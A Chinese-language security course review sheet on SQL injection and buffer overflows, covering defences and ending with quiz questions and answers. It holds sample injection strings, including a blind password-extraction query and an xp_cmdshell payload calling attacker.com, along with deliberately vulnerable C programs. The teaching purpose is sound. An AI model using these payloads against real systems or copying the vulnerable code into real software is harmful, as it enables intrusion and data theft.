# Day 7 复习：SQL注入与缓冲区溢出

## 学习目标
- 理解SQL注入攻击的原理
- 掌握SQL注入的三种类型
- 理解SQL注入的防御措施
- 理解缓冲区溢出的原理
- 区分栈溢出和堆溢出
- 掌握防御缓冲区溢出的方法

---

## 一、SQL注入攻击

### 1.1 什么是SQL注入

**SQL注入（SQL Injection）**：攻击者通过在Web应用输入中插入恶意SQL代码，欺骗数据库服务器执行恶意操作的攻击方式。

### 1.2 SQL注入的原理

**正常输入**：
```
用户输入：admin' OR '1'='1
数据库查询：SELECT * FROM users WHERE username='admin' OR '1'='1'
结果：返回所有用户数据（因为'1'='1'总是真）
```

**攻击过程**：
```
1. 攻击者在输入框输入恶意SQL代码
2. Web应用将输入直接拼接到SQL查询中
3. 数据库执行恶意SQL语句
4. 攻击者获得未授权的数据访问
```

### 1.3 SQL注入的危害

| 危害 | 说明 |
|------|------|
| **数据泄露** | 获取敏感数据（密码、个人信息） |
| **数据篡改** | 修改或删除数据 |
| **权限提升** | 获得管理员权限 |
| **服务器控制** | 执行系统命令（极端情况） |
| **绕过认证** | 绕过登录验证 |

### 1.4 SQL注入的三种类型

#### **类型1：带内注入（In-band）**

**定义**：攻击结果直接显示在Web页面的正常返回中。

**特点**：
- 最常见的类型
- 攻击结果可见
- 易于发现和利用

**示例**：
```
攻击者输入：admin' OR '1'='1' --
页面返回：所有用户数据（直接显示）
```

#### **类型2：带外注入（Out-of-band）**

**定义**：攻击结果通过其他信道（如DNS、HTTP请求）传回给攻击者。

**特点**：
- 攻击结果不直接显示
- 需要特殊配置
- 难以检测

**示例**：
```
攻击者输入：'; EXEC xp_cmdshell('nslookup attacker.com') --
攻击者控制的DNS服务器收到查询
```

#### **类型3：推理攻击（Inference）**

**定义**：通过观察应用程序的不同响应，来推断数据库结构和数据。

**特点**：
- 无直接输出
- 需要多次请求
- 最隐蔽

**示例**：
```
请求1：admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
页面正常 → 密码第一个字符是a

请求2：admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b'--
页面异常 → 密码第一个字符不是b

重复以上过程，逐字符猜解密码
```

### 1.5 SQL注入的防御措施

#### **防御1：参数化查询（Prepared Statement）** - 核心方法

**原理**：将用户输入作为数据参数，而不是SQL代码的一部分来执行。

**示例（PHP）**：
```php
// 不安全的代码
$sql = "SELECT * FROM users WHERE username='$username'";

// 安全的代码（参数化查询）
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=:username");
$stmt->execute(['username' => $username]);
```

**优点**：
- 从根本上防止SQL注入
- 性能好
- 易于实现

#### **防御2：输入验证和转义**

**原理**：对用户输入进行验证和特殊字符转义。

**示例**：
```php
// 输入验证
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username");
}

// 转义
$username = mysqli_real_escape_string($conn, $username);
```

**优点**：
- 简单易行

**缺点**：
- 容易遗漏
- 不如参数化查询安全

#### **防御3：最小权限原则**

**原理**：数据库账户只授予必要的最小权限。

**示例**：
```sql
-- 只授予查询权限，不授予修改权限
GRANT SELECT ON mydb.* TO 'webuser'@'localhost';
```

#### **防御4：Web应用防火墙（WAF）**

**原理**：使用安全设备检测和阻断SQL注入攻击。

**优点**：
- 部署简单
- 能防御已知攻击

**缺点**：
- 不能防御所有攻击
- 需要更新规则

### 1.6 SQL注入防御总结

| 方法 | 有效性 | 实现难度 | 推荐度 |
|------|--------|---------|--------|
| 参数化查询 | 最高 | 中 | 必须使用 |
| 输入验证 | 中 | 低 | 辅助使用 |
| 最小权限 | 高 | 低 | 必须使用 |
| WAF | 中 | 低 | 辅助使用 |

---

## 二、缓冲区溢出

### 2.1 什么是缓冲区溢出

**缓冲区溢出（Buffer Overflow）**：程序向缓冲区写入的数据量超过了其预先分配的内存空间大小，导致数据越界，覆盖了相邻的合法内存区域。

### 2.2 缓冲区溢出的危害

| 危害 | 说明 |
|------|------|
| **程序崩溃** | 数据被破坏，程序异常终止 |
| **数据破坏** | 相邻数据被覆盖 |
| **权限提升** | 攻击者控制程序执行流程 |
| **系统控制** | 执行恶意代码（shellcode） |

### 2.3 缓冲区溢出持续存在的原因

1. **遗留代码**：大量存在已久的未修复漏洞
2. **编程习惯**：对用户输入缺乏严格的边界检查
3. **语言特性**：C/C++等语言不自动检查边界

### 2.4 缓冲区溢出的类型

#### **类型1：栈溢出（Stack Overflow）** - 重点

**发生位置**：函数调用时的栈（Stack）中

**栈的作用**：
- 存放局部变量
- 存放函数返回地址
- 存放函数调用信息

**危险之处**：
- 局部变量和返回地址在栈上的存储位置相邻
- 如果缓冲区（局部变量）溢出，多余的数据会向上覆盖
- 可能篡改返回地址

**攻击过程**：
```
1. 攻击者提供超长输入
2. 输入超过缓冲区大小
3. 多余的数据覆盖返回地址
4. 函数返回时，程序跳转到攻击者指定的位置
5. 执行攻击者的恶意代码（shellcode）
```

**栈的结构**：
```
高地址
┌─────────────┐
│ 参数         │
├─────────────┤
│ 返回地址     │ ← 被覆盖的目标
├─────────────┤
│ 旧的EBP      │
├─────────────┤
│ 局部变量     │ ← 缓冲区在此
├─────────────┤
│ ...          │
└─────────────┘
低地址
```

**栈溢出的C代码实例**：

```c
// vulnerable.c - 栈溢出漏洞示例
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];  // 64字节的缓冲区
    
    // 漏洞：没有检查input长度，直接复制到buffer
    strcpy(buffer, input);
    
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    vulnerable_function(argv[1]);
    return 0;
}
```

**攻击过程演示**：

```bash
# 编译（禁用栈保护，便于演示）
gcc -fno-stack-protector -z execstack -o vulnerable vulnerable.c

# 正常输入
./vulnerable "Hello"
# 输出：Input: Hello

# 溢出攻击：输入128个字符（超过buffer的64字节）
./vulnerable $(python -c "print('A'*128)")
# 可能导致段错误（覆盖了返回地址）

# 精确攻击：覆盖返回地址到shellcode
# 需要计算buffer到返回地址的偏移
```

#### **类型2：堆溢出（Heap Overflow）**

**发生位置**：程序动态分配的内存区域——堆（Heap）

**堆的特点**：
- 用于动态内存分配（malloc、new）
- 没有直接的返回地址

**攻击方式**：
- 破坏堆上的控制数据
- 覆盖函数指针
- 覆盖对象虚函数表指针
- 破坏内存管理链表结构

**堆溢出的C代码实例**：

```c
// heap_overflow.c - 堆溢出漏洞示例
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char name[64];
    void (*callback)();  // 函数指针
} UserRecord;

void malicious_code() {
    printf("Malicious code executed!\n");
    // 这里可以是shellcode
}

void legitimate_callback() {
    printf("Legitimate callback executed\n");
}

int main(int argc, char *argv[]) {
    UserRecord *user1, *user2;
    
    // 分配两个堆对象
    user1 = (UserRecord *)malloc(sizeof(UserRecord));
    user2 = (UserRecord *)malloc(sizeof(UserRecord));
    
    if (!user1 || !user2) {
        printf("Memory allocation failed\n");
        return 1;
    }
    
    // 设置user1的回调函数为合法函数
    user1->callback = legitimate_callback;
    
    // 漏洞：没有检查输入长度
    printf("Enter name for user1: ");
    scanf("%s", user1->name);  // 溢出！
    
    // 如果输入超过64字节，会溢出到user1->callback
    // 攻击者可以覆盖callback为malicious_code的地址
    
    printf("Executing user1 callback:\n");
    user1->callback();
    
    free(user1);
    free(user2);
    return 0;
}
```

**攻击原理**：
```
堆内存布局：
user1: [name(64字节)] [callback(8字节)]
user2: [name(64字节)] [callback(8字节)]

当输入超过64字节时：
- 溢出会覆盖user1->callback
- 如果覆盖为malicious_code的地址
- 调用user1->callback()就会执行恶意代码
```

#### **类型3：全局数据区溢出**

**发生位置**：存放全局变量和静态数据的区域

**特点**：
- 溢出可能破坏相邻的关键数据
- 危害相对较小（因为没有返回地址）

### 2.5 Shellcode

**定义**：一段用于攻击的机器码，通常功能是启动一个命令行解释器（Shell），让攻击者获得系统控制权。

**特点**：
- 是机器码，不是高级语言
- 与特定处理器架构相关
- 与操作系统紧密相关

### 2.6 寻找缓冲区溢出漏洞的方法

1. **阅读源码**：检查边界检查代码
2. **跟踪执行**：在程序处理超长输入时跟踪其行为
3. **模糊测试**：使用自动化工具提供随机输入

---

## 三、缓冲区溢出的防御措施

### 3.1 编译时防御

#### **方法1：使用安全的编程语言**

**原理**：使用会自动进行边界检查的高级语言（如Java、Python、C#）。

**优点**：
- 从根源上防止缓冲区溢出

**缺点**：
- 不能改变已有的C/C++代码
- 性能可能受影响

#### **方法2：使用编译器的安全机制**

**原理**：利用编译器的安全选项和检查机制。

**示例**：
- Stack Guard
- Stack Smashing Protector（SSP）
- AddressSanitizer（ASan）

### 3.2 运行时防御

#### **方法1：不可执行栈/堆（NX/DEP）**

**原理**：利用硬件支持，将栈和堆等数据区域标记为"不可执行"。

**效果**：
- 即使攻击者将Shellcode写入这些区域
- 程序也无法作为指令执行

**实现**：
- NX bit（AMD）
- DEP（Data Execution Prevention）（Windows）

#### **方法2：地址空间布局随机化（ASLR）**

**原理**：每次程序运行时，将栈、堆、库等关键区域的加载地址随机化。

**效果**：
- 攻击者难以预测恶意代码或跳转目标的确切位置

**示例**：
```
程序第1次运行：栈地址 = 0x7fff1234
程序第2次运行：栈地址 = 0x7fff5678
程序第3次运行：栈地址 = 0x7fff9abc
```

#### **方法3：栈保护机制（Stack Canaries）**

**原理**：在栈的关键位置（如返回地址前）放置一个"金丝雀"值。函数返回前检查此值是否被篡改。

**工作流程**：
```
1. 函数开始：在栈上放置金丝雀值
2. 函数执行：正常进行
3. 函数结束：检查金丝雀值
4. 如果被篡改：终止程序
5. 如果未篡改：正常返回
```

**栈保护机制的C代码实例**：

```c
// stack_canary.c - 栈保护机制演示
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    unsigned long canary;  // 金丝雀值
    
    // 函数开始：设置金丝雀值
    canary = 0xDEADBEEF;  // 实际系统中是随机值
    
    strcpy(buffer, input);  // 潜在的溢出点
    
    // 函数结束：检查金丝雀值
    if (canary != 0xDEADBEEF) {
        printf("Stack smashing detected! Canary corrupted.\n");
        return;  // 或调用abort()
    }
    
    printf("Function executed safely: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    vulnerable_function(argv[1]);
    return 0;
}
```

**编译和测试**：
```bash
# 使用栈保护编译（GCC默认启用-fstack-protector）
gcc -fstack-protector -o stack_canary stack_canary.c

# 正常输入
./stack_canary "Hello"
# 输出：Function executed safely: Hello

# 溢出攻击
./stack_canary $(python -c "print('A'*128)")
# 输出：Stack smashing detected! Canary corrupted.
```

**优点**：
- 能检测缓冲区溢出
- 开销小

**缺点**：
- 不能完全防止溢出
- 金丝雀值可能被泄露

#### **方法4：隔离带（Memory Barriers）**

**原理**：在进程地址空间中设置不可访问的内存区域。

**效果**：
- 程序试图越界访问这些区域时
- 会触发异常并被终止

### 3.3 防御措施总结

| 方法 | 类型 | 原理 | 优点 | 缺点 |
|------|------|------|------|------|
| 安全语言 | 编译时 | 自动边界检查 | 根本解决 | 不能改旧代码 |
| NX/DEP | 运行时 | 不可执行 | 防止Shellcode执行 | 可被绕过 |
| ASLR | 运行时 | 地址随机化 | 难以预测 | 随机性有限 |
| 栈保护 | 运行时 | 金丝雀检测 | 检测溢出 | 不能完全防止 |

---

## 四、本章知识点总结

```
SQL注入与缓冲区溢出
├── SQL注入
│   ├── 原理和危害
│   ├── 三种类型（带内、带外、推理）
│   └── 防御措施（参数化查询核心）
│
└── 缓冲区溢出
    ├── 原理和危害
    ├── 三种类型（栈、堆、全局）
    ├── Shellcode
    └── 防御措施（编译时、运行时）
```

---

## 五、配套练习题

### 5.1 填空题

1. SQL注入通过在输入中插入（）实现。
2. SQL注入有三种类型：带内注入、（）、推理攻击。
3. 防御SQL注入的核心方法是（）。
4. 缓冲区溢出是（）错误。
5. 栈溢出可以覆盖（）。
6. 堆溢出可以覆盖（）或虚表指针。
7. Shellcode是攻击用的（）。
8. ASLR通过（）地址来防御。
9. 栈保护机制使用（）检测溢出。
10. NX/DEP将栈标记为（）。

### 5.2 判断题

1. SQL注入只能导致数据泄露。（）
2. 参数化查询是防御SQL注入的最佳方法。（）
3. 缓冲区溢出只能发生在栈上。（）
4. Shellcode是高级语言编写的。（）
5. ASLR能完全防止缓冲区溢出。（）
6. 堆溢出可以覆盖返回地址。（）
7. 编译器不能提供安全检查。（）
8. 栈保护机制有性能开销。（）
9. SQL注入不能绕过认证。（）
10. 使用Java可以防止缓冲区溢出。（）

### 5.3 名词解释

1. **SQL注入**
2. **带内注入**
3. **推理攻击**
4. **参数化查询**
5. **缓冲区溢出**
6. **栈溢出**
7. **Shellcode**
8. **ASLR**

### 5.4 简答题

1. **解释SQL注入的原理和危害。**
2. **对比SQL注入的三种类型。**
3. **解释参数化查询如何防御SQL注入。**
4. **解释缓冲区溢出的原理。**
5. **对比栈溢出和堆溢出的区别。**
6. **解释ASLR如何防御缓冲区溢出。**
7. **解释栈保护机制（Canary）的工作原理。**
8. **如何从编译时和运行时防御缓冲区溢出？**

### 5.5 参考答案

#### 填空题答案：
1. 恶意SQL代码
2. 带外注入
3. 参数化查询
4. 编程
5. 返回地址
6. 函数指针
7. 机器码
8. 随机化
9. 金丝雀值
10. 不可执行

#### 判断题答案：
1. × （还能篡改、删除数据）
2. √
3. × （堆和全局区也会）
4. × （机器码）
5. × （不能完全防止）
6. × （堆没有直接返回地址）
7. × （可以提供安全检查）
8. √
9. × （可以绕过认证）
10. √

